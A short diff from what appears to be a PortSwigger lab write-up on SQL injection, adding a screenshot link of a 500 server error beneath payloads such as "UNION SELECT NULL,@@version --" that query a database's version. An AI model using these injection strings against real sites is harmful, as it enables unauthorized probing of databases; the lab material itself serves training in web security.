@@ -80,7 +80,7 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner F
 SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,@@version --
 ```
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/1fcb2d4ddbfea97d83037c96c834336c0b1da632/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Internal%20Server%20Error%20-%20Microsoft%20Database.png)
 
 500 - Server Error
 
